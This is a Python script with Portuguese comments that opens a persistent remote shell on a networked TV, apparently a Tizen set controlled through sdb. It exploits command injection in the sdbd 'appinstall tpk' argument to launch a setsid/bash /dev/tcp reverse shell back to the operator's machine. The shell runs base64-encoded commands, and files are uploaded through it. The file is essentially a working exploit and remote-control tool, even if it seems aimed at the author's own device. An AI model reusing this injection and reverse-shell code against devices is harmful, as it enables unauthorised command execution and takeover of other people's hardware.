#!/usr/bin/env python3
"""Shell sdk persistente na TV, aberto com uma unica injecao de appinstall.

O sdbd desta TV trava por alguns minutos depois de cada `appinstall tpk`. Este
agente e iniciado uma vez e mantem um shell vivo por TCP; os comandos seguintes
nao passam mais pelo sdbd.

Uso interativo:
    py -3 tools/tv_agent.py

Uso como biblioteca:
    from tv_agent import Agent
    agent = Agent(Tv("192.168.1.50"))
    agent.start()
    print(agent.run("id"))
    agent.push("arquivo.dll", "/home/owner/share/tmp/sdk_tools/arquivo.dll")
    agent.close()
"""
from __future__ import annotations

import argparse
import base64
import pathlib
import socket
import sys
import threading
import time

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))
from tv import Tv  # noqa: E402


class Agent:
    def __init__(self, tv: Tv, timeout: float = 600) -> None:
        self.tv = tv
        self.timeout = timeout
        self.socket: socket.socket | None = None
        self._lock = threading.Lock()
        self._buffer = b""

    def start(self) -> None:
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((self.tv.callback, 0))
        listener.listen(1)
        listener.settimeout(30)
        port = listener.getsockname()[1]
        # Mantem o shell vivo depois que o appinstall retorna. O loop le uma
        # linha base64, executa e devolve a saida no mesmo socket.
        command = (
            "setsid sh -c 'exec 3<>/dev/tcp/"
            f"{self.tv.callback}/{port};"
            "while read b<&3;do { echo $b|base64 -d|sh;}>&3 2>&3;"
            'echo "[exit:$?]" >&3;done\' </dev/null >/dev/null 2>&1 &'
        )
        injection = self.tv._injection(command)
        argument = "0 appinstall tpk " + injection
        if len(argument.encode()) > 500:
            listener.close()
            raise RuntimeError("comando do agente grande demais para a injecao")

        def launch() -> None:
            try:
                self.tv._run(("shell", argument), timeout=30)
            except Exception:
                pass

        threading.Thread(target=launch, daemon=True).start()
        try:
            connection, _ = listener.accept()
        except TimeoutError as error:
            listener.close()
            raise RuntimeError("a TV nao abriu o shell persistente") from error
        finally:
            listener.close()
        connection.settimeout(30)
        self.socket = connection

    def run(self, command: str, timeout: float = 300) -> tuple[str, int]:
        if self.socket is None:
            raise RuntimeError("agente nao iniciado")
        with self._lock:
            encoded = base64.b64encode(command.encode("utf-8"))
            self.socket.sendall(encoded + b"\n")
            deadline = time.monotonic() + timeout
            data = b""
            while b"[exit:" not in data:
                if self._buffer:
                    data += self._buffer
                    self._buffer = b""
                remaining = deadline - time.monotonic()
                if remaining <= 0:
                    return data.decode("utf-8", errors="replace"), -1
                self.socket.settimeout(min(5, remaining))
                try:
                    chunk = self.socket.recv(65536)
                except TimeoutError:
                    continue
                if not chunk:
                    break
                data += chunk
            text = data.decode("utf-8", errors="replace")
            index = text.rfind("[exit:")
            if index < 0:
                return text, -1
            end = text.find("]", index)
            try:
                code = int(text[index + 6:end])
            except ValueError:
                code = -1
            rest = text[end + 1:]
            if rest.startswith("\n"):
                rest = rest[1:]
            self._buffer = rest.encode("utf-8")
            return text[:index].rstrip("\n"), code

    def push(self, local: pathlib.Path | str, remote: str) -> None:
        """Transfere um arquivo pelo proprio shell, sem sdb push."""
        data = pathlib.Path(local).read_bytes()
        payload = base64.b64encode(data).decode("ascii")
        # Em blocos para nao montar uma linha gigante.
        self.run(f": > {remote}", timeout=60)
        for start in range(0, len(payload), 20000):
            chunk = payload[start:start + 20000]
            output, code = self.run(
                f"printf %s {chunk} | base64 -d >> {remote}", timeout=120
            )
            if code != 0:
                raise RuntimeError(f"falha ao enviar {remote}: {output}")
        remote_size = int(self.run(f"wc -c < {remote}")[0].strip() or -1)
        if remote_size != len(data):
            raise RuntimeError(
                f"{remote}: enviados {len(data)} bytes, chegaram {remote_size}"
            )

    def close(self) -> None:
        if self.socket is not None:
            try:
                self.socket.close()
            finally:
                self.socket = None


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--tv", default=None)
    args = parser.parse_args()
    import os
    tv = Tv(args.tv or os.environ.get("KURUMI_TV", "192.168.1.50"))
    tv.connect()
    agent = Agent(tv)
    print("== Abrindo shell persistente (uma injecao)")
    agent.start()
    print("== Pronto. Ctrl+D para sair.")
    try:
        for line in sys.stdin:
            command = line.rstrip("\n")
            if not command:
                continue
            output, code = agent.run(command)
            print(output)
            if code:
                print(f"[exit {code}]")
    finally:
        agent.close()
    return 0


if __name__ == "__main__":
    sys.stdout.reconfigure(encoding="utf-8")
    raise SystemExit(main())
